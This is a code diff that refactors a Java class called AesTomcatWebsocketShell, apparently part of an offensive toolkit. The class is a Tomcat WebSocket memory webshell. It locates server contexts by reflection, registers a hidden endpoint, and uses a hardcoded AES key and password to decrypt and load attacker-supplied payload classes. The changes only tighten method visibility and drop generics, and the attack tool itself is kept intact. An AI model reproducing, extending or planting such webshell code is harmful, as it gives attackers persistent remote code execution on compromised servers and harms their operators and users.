@@ -21,10 +21,10 @@ import java.util.Map;
 public class AesTomcatWebsocketShell extends Endpoint implements MessageHandler.Whole<ByteBuffer>{
     private static boolean initialized = false;
     private static final Object lock = new Object();
-    Class payload = null;
-    Session session = null;
-    String xc = "3c6e0b8a9c15224a";
-    String pass = "pass";
+    private Class payload = null;
+    private Session session = null;
+    private String xc = "3c6e0b8a9c15224a";
+    private String pass = "pass";
 
 
     static {
@@ -48,9 +48,9 @@ public class AesTomcatWebsocketShell extends Endpoint implements MessageHandler.
         this.session = session;
     }
 
-    public static Object[] getStandardContexts() throws Throwable {
+    private static Object[] getStandardContexts() throws Throwable {
         HashSet contexts = new HashSet();
-        HashSet<String> blackType = new HashSet<String>();
+        HashSet blackType = new HashSet();
         blackType.add(int.class.getName());
         blackType.add(short.class.getName());
         blackType.add(long.class.getName());
@@ -81,7 +81,7 @@ public class AesTomcatWebsocketShell extends Endpoint implements MessageHandler.
         }
         return contexts.toArray();
     }
-    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
+    private static Object searchObject(String targetClassName, Object object, HashSet blacklist,HashSet blackType,int maxDepth,int currentDepth)throws Throwable {
         currentDepth++;
 
         if (currentDepth >= maxDepth){
@@ -98,14 +98,14 @@ public class AesTomcatWebsocketShell extends Endpoint implements MessageHandler.
             if (!blacklist.contains(hash)) {
                 blacklist.add(new Integer(hash));
                 Field[] fields = null;
-                ArrayList<Field> fieldsArray = new ArrayList();
+                ArrayList fieldsArray = new ArrayList();
                 Class objClass = object.getClass();
                 while (objClass != null){
                     Field[] fields1 = objClass.getDeclaredFields();
                     fieldsArray.addAll(Arrays.asList(fields1));
                     objClass = objClass.getSuperclass();
                 }
-                fields = fieldsArray.toArray(new Field[0]);
+                fields = (Field[]) fieldsArray.toArray(new Field[0]);
 
 
                 for (int i = 0; i < fields.length; i++) {
@@ -145,7 +145,7 @@ public class AesTomcatWebsocketShell extends Endpoint implements MessageHandler.
         return null;
 
     }
-    public static boolean canAdd(Object obj,String path) {
+    private static boolean canAdd(Object obj,String path) {
         try {
             java.lang.reflect.Method method = obj.getClass().getMethod("findMapping",new Class[]{String.class});
             if (method.invoke(obj,new Object[]{ path }) != null){
@@ -189,7 +189,7 @@ public class AesTomcatWebsocketShell extends Endpoint implements MessageHandler.
         return isOk;
     }
 
-    public static Field getField(Object obj, String fieldName){
+    private static Field getField(Object obj, String fieldName){
         Class clazz = null;
 
         if(obj == null){
@@ -217,7 +217,7 @@ public class AesTomcatWebsocketShell extends Endpoint implements MessageHandler.
 
         return field;
     }
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
         Field f=null;
         if (obj instanceof Field){
             f=(Field)obj;
@@ -229,7 +229,7 @@ public class AesTomcatWebsocketShell extends Endpoint implements MessageHandler.
         }
         return null;
     }
-    public byte[] aes(byte[] s,boolean m){
+    private byte[] aes(byte[] s,boolean m){
         try{
             javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
             c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
